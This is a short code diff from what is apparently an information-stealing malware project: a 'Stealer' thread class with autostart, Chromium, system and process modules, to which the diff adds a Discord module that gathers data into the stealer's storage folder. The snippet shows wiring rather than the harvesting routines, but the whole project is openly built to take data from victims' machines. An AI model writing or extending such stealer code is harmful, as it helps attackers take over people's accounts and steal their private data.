@@ -8,6 +8,7 @@ from .utils.autostart import Autostart
 from .utils.config import MultistealerConfig
 
 from .modules.system import System
+from .modules.discord import Discord
 from .modules.chromium import Chromium
 
 
@@ -86,6 +87,15 @@ class Stealer(Thread):
                     self.config.StorageFolder,
                     "System",
                     (self.screen, self.system, self.processes),
+                    self.errors
+                )
+            },
+            {
+                "object": Discord(
+                    self.config.StoragePath,
+                    self.config.StorageFolder,
+                    "Programs",
+                    (self.discord,),
                     self.errors
                 )
             }
